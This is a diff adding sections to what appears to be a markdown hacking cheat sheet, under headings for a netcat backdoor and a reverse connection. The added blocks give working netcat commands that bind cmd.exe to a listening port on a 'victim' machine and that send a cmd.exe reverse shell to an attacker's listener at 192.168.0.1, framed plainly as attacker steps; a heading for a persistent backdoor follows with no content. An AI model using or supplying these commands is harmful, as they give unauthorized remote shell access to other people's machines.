@@ -53,3 +53,25 @@
 #### Data Stealing Software
 > Malicious software program capable of stealing most sensitive data.
 
+#### Backdoor With Netcat
+
+```
+ncat.exe -l -p 5555 -e cmd.exe >> In victims Machine
+
+nc 192.168.10.102 5555
+
+```
+
+#### Reverse Connection With Netcat
+
+> Victim is on internal network and attacker wants to connect to it.
+
+```
+nc -lvp 5555  >> Attacker listens on port 5555
+nc.exe -e cmd.exe 192.168.0.1 5555
+
+
+```
+
+#### Creating Persistent Backdoor With Netcat
+
